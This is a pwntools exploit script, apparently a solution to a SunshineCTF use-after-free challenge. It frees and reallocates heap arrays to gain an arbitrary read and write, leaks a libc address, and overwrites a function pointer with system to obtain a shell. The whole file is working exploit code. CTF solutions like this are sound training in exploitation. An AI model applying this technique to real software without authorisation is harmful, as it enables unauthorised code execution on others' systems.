from pwn import *
from ctypes import c_int
r = process(["./uaf"])
#r = remote("chal1.sunshinectf.org", 20001)

def create_array(num,arr):
	r.sendlineafter("(>)","1")
	r.sendlineafter("?",str(num))
	r.sendlineafter(":","\t".join(arr))
	r.recvuntil("array: ")
	return int(r.recvline())


def create_string(content):
	r.sendlineafter("(>)","2")
	r.sendlineafter(":",content)
	r.recvuntil("string: ")
	return int(r.recvline())

def edit_array(id,idx,value):
	r.sendlineafter("(>)","3")
	r.sendlineafter(":",str(id))
	r.sendlineafter(":",str(idx))
	r.sendlineafter(":",str(value))


def remove_array(id):
	r.sendlineafter("(>)","6")
	r.sendlineafter(":",str(id))

def remove_string(id):
	r.sendlineafter("(>)","7")
	r.sendlineafter(":",str(id))


arr1 = create_array(10,["10"]*10)
arr2 = create_array(10,["10"]*10)
remove_array(arr1)
remove_array(arr2)
arr3 = create_array(2,["10"]*2)
edit_array(arr3,0,0x1)
edit_array(arr3,1,0x804a810)
print arr1


r.sendlineafter("(>)","4")
r.sendlineafter(":",str(arr1))
r.recvuntil("[")
libc = (int(r.recvuntil("]")[:-1])&0xffffffff)-0x0018540
print  hex(libc)
system = 0x003ada0+libc
print hex(system)
edit_array(arr3,1,0x804a80c)
edit_array(arr1,0,c_int(system).value)

r.interactive()
